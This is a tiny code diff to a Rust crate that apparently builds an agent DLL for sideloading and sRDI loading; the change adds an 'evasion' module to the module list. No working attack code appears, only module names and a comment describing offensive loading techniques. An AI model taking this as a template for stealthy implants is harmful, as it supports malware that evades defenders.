@@ -3,6 +3,7 @@
 // - DLL build (cdylib): exports Run() → agent::agent_run(); used by sideloading / sRDI.
 
 pub mod agent;
+pub mod evasion;
 pub mod overlay;
 pub mod plugins;
 pub mod protocol;
